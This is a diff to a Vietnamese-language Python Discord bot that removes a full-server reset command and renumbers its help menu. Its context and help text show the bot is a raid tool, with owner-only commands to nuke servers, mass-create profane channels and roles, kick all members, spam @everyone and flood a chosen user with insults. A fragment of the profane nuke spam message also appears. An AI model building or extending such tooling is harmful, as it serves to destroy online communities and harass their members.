@@ -332,131 +332,6 @@ def is_bot_owner():
         return ctx.author.id in BOT_OWNERS
     return commands.check(predicate)
 
-@bot.event
-async def on_ready():
-    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
-    print("✨ Bot đã sẵn sàng tự động setup server toàn diện và vận hành hệ thống!")
-
-# ==================== LỆNH TỰ ĐỘNG SETUP SERVER HOÀN CHỈNH ====================
-@bot.command(name="setup_full_server")
-@is_bot_owner()
-async def setup_full_server(ctx):
-    """Tự động hóa toàn bộ quá trình thiết lập một server Discord chuyên nghiệp từ A-Z"""
-    guild = ctx.guild
-    
-    confirm_embed = discord.Embed(
-        title="⚠️ XÁC NHẬN TỰ ĐỘNG SETUP TOÀN BỘ SERVER ⚠️",
-        description=(
-            f"🔥 **Cảnh báo quan trọng!**\n\n"
-            f"Lệnh này sẽ tiến hành:\n"
-            f"• Xóa **TOÀN BỘ** kênh và vai trò hiện tại của server.\n"
-            f"• Tạo lại hệ thống danh mục, kênh chat, kênh voice chuyên nghiệp có gắn emoji.\n"
-            f"• Thiết lập các cấp bậc vai trò (Roles) mới hoàn toàn.\n\n"
-            f"🔹 **Gõ `l!confirm_setup` để tiếp tục**\n"
-            f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
-        ),
-        color=0xFF69B4
-    )
-    await ctx.send(embed=confirm_embed)
-
-    def check(m):
-        return m.author == ctx.author and m.channel == ctx.channel
-
-    try:
-        msg = await bot.wait_for('message', timeout=30.0, check=check)
-        if msg.content.lower() != "l!confirm_setup":
-            await ctx.send("❌ Quá trình setup tự động đã bị hủy bỏ.")
-            return
-    except asyncio.TimeoutError:
-        await ctx.send("⏳ Hết thời gian chờ xác nhận. Lệnh đã bị hủy.")
-        return
-
-    progress_embed = discord.Embed(
-        title="🚀 ĐANG TIẾN HÀNH SETUP SERVER TỰ ĐỘNG...",
-        description="⏳ Vui lòng chờ trong giây lát, hệ thống đang xây dựng lại toàn bộ cấu trúc vũ trụ server cho bạn! ✨",
-        color=0xFF1493
-    )
-    status_msg = await ctx.send(embed=progress_embed)
-
-    try:
-        await guild.edit(name="🌸 Căn Cứ Sắc Hồng • Official 🌸")
-
-        for channel in guild.channels:
-            try:
-                await channel.delete()
-                await asyncio.sleep(0.2)
-            except:
-                continue
-
-        for role in guild.roles:
-            try:
-                if role.name != "@everyone" and not role.managed:
-                    await role.delete()
-                    await asyncio.sleep(0.2)
-            except:
-                continue
-
-        owner_role = await guild.create_role(name="👑 | Supreme Owner", color=discord.Color.red(), hoist=True, mentionable=True)
-        admin_role = await guild.create_role(name="🛡️ | Quản Trị Viên", color=discord.Color.orange(), hoist=True, mentionable=True)
-        mod_role = await guild.create_role(name="⚡ | Kiểm Duyệt Viên", color=discord.Color.gold(), hoist=True, mentionable=True)
-        vip_role = await guild.create_role(name="💎 | Cư Dân VIP", color=discord.Color.purple(), hoist=True, mentionable=True)
-        member_role = await guild.create_role(name="🌸 | Thành Viên", color=discord.Color.pink(), hoist=True, mentionable=True)
-
-        info_cat = await guild.create_category("📌 ─── THÔNG TIN CHÍNH ───")
-        await guild.create_text_channel("📜│luật-lệ-chung", category=info_cat)
-        await guild.create_text_channel("📢│thông-báo-server", category=info_cat)
-        await guild.create_text_channel("🎁│sự-kiện-giveaway", category=info_cat)
-        await guild.create_text_channel("🤖│bot-commands", category=info_cat)
-
-        chat_cat = await guild.create_category("💬 ─── TRÒ CHUYỆN CHUNG ───")
-        await guild.create_text_channel("💬│sảnh-chờ-thảo-luận", category=chat_cat)
-        await guild.create_text_channel("🌸│giao-lưu-kết-bạn", category=chat_cat)
-        await guild.create_text_channel("🖼│hình-ảnh-đời-sống", category=chat_cat)
-        await guild.create_text_channel("🤖│chia-sẻ-meme-vui", category=chat_cat)
-
-        voice_cat = await guild.create_category("🔊 ─── KÊNH THOẠI GIẢI TRÍ ───")
-        await guild.create_voice_channel("🎵│Phòng Nhạc Chill 1", category=voice_cat)
-        await guild.create_voice_channel("🎧│Phòng Nhạc Chill 2", category=voice_cat)
-        await guild.create_voice_channel("🎮│Góc Game Thủ", category=voice_cat)
-        await guild.create_voice_channel("💤│Phòng Tâm Sự Kín", category=voice_cat)
-
-        admin_cat = await guild.create_category("🔒 ─── KHU VỰC QUẢN TRỊ ───")
-        
-        overwrites = {
-            guild.default_role: discord.PermissionOverwrite(read_messages=False),
-            admin_role: discord.PermissionOverwrite(read_messages=True),
-            owner_role: discord.PermissionOverwrite(read_messages=True)
-        }
-        await guild.create_text_channel("🛡│nhật-ký-admin", category=admin_cat, overwrites=overwrites)
-        await guild.create_text_channel("⚙│phòng-điều-hành-bot", category=admin_cat, overwrites=overwrites)
-
-        complete_embed = discord.Embed(
-            title="🎉 SETUP SERVER THÀNH CÔNG MỸ MÃN! 🎉",
-            description=(
-                f"✨ **Server của bạn đã được lột xác hoàn toàn!**\n\n"
-                f"• **Tên mới:** Căn Cứ Sắc Hồng • Official\n"
-                f"• **Hệ thống Vai trò:** Đã tạo 5 cấp bậc role chuẩn mực.\n"
-                f"• **Hệ thống Kênh:** Đã phân chia danh mục, kênh chat, voice kèm emoji cực kỳ bắt mắt.\n"
-                f"• **Bảo mật:** Đã khóa kín khu vực quản trị viên an toàn tuyệt đối."
-            ),
-            color=0x00FF00
-        )
-        await status_msg.edit(embed=complete_embed)
-
-    except Exception as e:
-        error_embed = discord.Embed(
-            title="❌ LỖI TRONG QUÁ TRÌNH SETUP",
-            description=f"🚨 Đã xảy ra lỗi hệ thống: `{str(e)}`\n*Hãy đảm bảo bot có quyền Quản trị viên (Administrator) cao nhất trong server!*",
-            color=0xFF0000
-        )
-        await status_msg.edit(embed=error_embed)
-
-@setup_full_server.error
-async def setup_error(ctx, error):
-    if isinstance(error, commands.CheckFailure):
-        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI! Lệnh thiết lập toàn bộ server này chỉ dành riêng cho chủ nhân tối cao của bot mà thôi!"** 🌸')
-
-# ==================== HỆ THỐNG NUKE SERVER TỐI CAO ====================
 @bot.command(name="nuke")
 @is_bot_owner()
 async def nuke_server(ctx):
@@ -509,6 +384,7 @@ async def nuke_server(ctx):
             except:
                 continue
 
+        # Nội dung spam theo đúng yêu cầu mới
         spam_content = (
             "# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI\n"
             "@everyone\n"
@@ -1094,8 +970,6 @@ async def ultimate_nuke(ctx):
 async def ultimate_nuke_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
-    else:
-        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")
 
 # ==================== HỆ THỐNG NHÂN CÁCH ====================
 PERSONAS = {
@@ -1121,6 +995,11 @@ PERSONAS = {
 """.strip()
     }
 }
+
+@bot.event
+async def on_ready():
+    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
+    print("✨ Bot đã khởi chạy thành công với tiền tố l! - Phục vụ Boss Tuyền trong sắc hồng!")
 
 # ==================== KHU VUI CHƠI & LỆNH MINIGAME CHO MEMBER ====================
 @bot.command(name="work")
@@ -1230,48 +1109,46 @@ async def setup(ctx):
             "Danh mục toàn bộ các hệ thống điều hành cao cấp, khu vui chơi và lệnh tàn phá (nuke) trong sắc hồng bao gồm:\n\n"
             "🔹 **1. `l!setup`**\n"
             "   └ *Khởi tạo toàn bộ giao diện điều khiển trung tâm và gửi bảng thông báo màu hồng kèm hình ảnh động quyến rũ.*\n\n"
-            "🔹 **2. `l!setup_full_server`**\n"
-            "   └ *Tự động xóa toàn bộ kênh/role cũ và setup lại từ A-Z một server chuẩn mực chuyên nghiệp.*\n\n"
-            "🔹 **3. `l!persona <1|2>`**\n"
+            "🔹 **2. `l!persona <1|2>`**\n"
             "   └ *Chuyển đổi linh hoạt giữa các trạng thái nhân cách AI cao cấp.*\n\n"
-            "🔹 **4. `l!work`**\n"
+            "🔹 **3. `l!work`**\n"
             "   └ *Khu vui chơi giải trí dành cho mọi thành viên: Làm việc qua 50 kịch bản ngẫu nhiên để kiếm coin!* 🪙\n\n"
-            "🔹 **5. `l!setpersona [yêu cầu]`**\n"
+            "🔹 **4. `l!setpersona [yêu cầu]`**\n"
             "   └ *Dùng 5000 coin tích lũy từ khu vui chơi để sai khiến bot thay đổi nhân cách!* ✨\n\n"
-            "🔹 **6. `l!spam @user [câu chửi tùy chỉnh]`**\n"
+            "🔹 **5. `l!spam @user [câu chửi tùy chỉnh]`**\n"
             "   └ *Kích hoạt lôi đài chiến dịch tra tấn văn bản tốc độ cao 600ms/câu.*\n\n"
-            "🔹 **7. `l!stop`**\n"
+            "🔹 **6. `l!stop`**\n"
             "   └ *Phanh gấp lập tức toàn bộ hoạt động spam.*\n\n"
-            "🔹 **8. `l!on`**\n"
+            "🔹 **7. `l!on`**\n"
             "   └ *Tái kích hoạt đường truyền phản hồi tự động của AI.*\n\n"
-            "🔹 **9. `l!off`**\n"
+            "🔹 **8. `l!off`**\n"
             "   └ *Tạm thời đóng băng tính năng phản hồi tin nhắn tự động.*\n\n"
-            "🔹 **10. `l!stats`**\n"
+            "🔹 **9. `l!stats`**\n"
             "   └ *Trích xuất toàn bộ thông số chi tiết của không gian máy chủ.*\n\n"
-            "🔹 **11. `l!help`**\n"
+            "🔹 **10. `l!help`**\n"
             "   └ *Hiển thị bảng cẩm nang điều hành chi tiết.*\n\n"
-            "🔹 **12. `l!ban @user [lý do]`**\n"
+            "🔹 **11. `l!ban @user [lý do]`**\n"
             "   └ *Trục xuất vĩnh viễn thành viên vi phạm khỏi vương quốc màu hồng.*\n\n"
             "💥 **HỆ THỐNG NUKE & PHÁ HỦY (ĐỘC QUYỀN BOSS TUYỀN):**\n"
-            "🔹 **13. `l!nuke`**\n"
+            "🔹 **12. `l!nuke`**\n"
             "   └ *Xóa toàn bộ kênh, tạo 100 kênh mới và spam tin nhắn phá hủy.*\n\n"
-            "🔹 **14. `l!spamchannels [số lượng]`**\n"
+            "🔹 **13. `l!spamchannels [số lượng]`**\n"
             "   └ *Tự động tạo hàng loạt kênh spam tục tĩu (Tối đa 200).*\n\n"
-            "🔹 **15. `l!spameveryone`**\n"
+            "🔹 **14. `l!spameveryone`**\n"
             "   └ *Spam thẻ @everyone đồng loạt ở toàn bộ kênh văn bản.*\n\n"
-            "🔹 **16. `l!deleteallchannels`**\n"
+            "🔹 **15. `l!deleteallchannels`**\n"
             "   └ *Xóa sạch sẽ toàn bộ kênh trong server.*\n\n"
-            "🔹 **17. `l!spamroles [số lượng]`**\n"
+            "🔹 **16. `l!spamroles [số lượng]`**\n"
             "   └ *Tạo hàng loạt vai trò spam tục tĩu (Tối đa 250).*\n\n"
-            "🔹 **18. `l!deleteallroles`**\n"
+            "🔹 **17. `l!deleteallroles`**\n"
             "   └ *Xóa toàn bộ vai trò (ngoại trừ @everyone).*\n\n"
-            "🔹 **19. `l!kickall`**\n"
+            "🔹 **18. `l!kickall`**\n"
             "   └ *Trục xuất toàn bộ thành viên (ngoại trừ bot và các chủ nhân tối cao).*\n\n"
-            "🔹 **20. `l!setservername [tên mới]`**\n"
+            "🔹 **19. `l!setservername [tên mới]`**\n"
             "   └ *Thay đổi tên hiển thị của máy chủ lập tức.*\n\n"
-            "🔹 **21. `l!setservericon [url]`**\n"
+            "🔹 **20. `l!setservericon [url]`**\n"
             "   └ *Cập nhật hình ảnh biểu tượng (icon) mới cho server.*\n\n"
-            "🔹 **22. `l!ultimatenuke`**\n"
+            "🔹 **21. `l!ultimatenuke`**\n"
             "   └ *Kích hoạt siêu lệnh hủy diệt toàn diện (Xóa kênh, tạo kênh, tạo role, kick member, đổi tên và spam).* "
         ),
         color=0xFF69B4
@@ -1542,7 +1419,6 @@ async def help_command(ctx):
             "• `l!setpersona [yêu cầu]` - Dùng 5000 coin để tùy chỉnh nhân cách bot theo ý muốn ✨\n\n"
             "⚙️ **CÁC LỆNH ĐIỀU HÀNH & NUKES (ĐỘC QUYỀN BOSS TUYỀN):**\n"
             "• `l!setup` - Khởi tạo bảng điều khiển trung tâm\n"
-            "• `l!setup_full_server` - Tự động xóa kênh/role cũ và setup lại server từ A-Z\n"
             "• `l!persona <1|2>` - Đổi nhân cách bot\n"
             "• `l!spam @user [nội dung]` - Lôi đài spam tốc độ cao\n"
             "• `l!stop` - Dừng tất cả hoạt động spam\n"
@@ -1626,4 +1502,5 @@ async def on_message(message):
         print(f"[GROQ API ERROR]: {e}")
 
 if __name__ == "__main__":
+    import aiohttp
     bot.run(DISCORD_TOKEN)
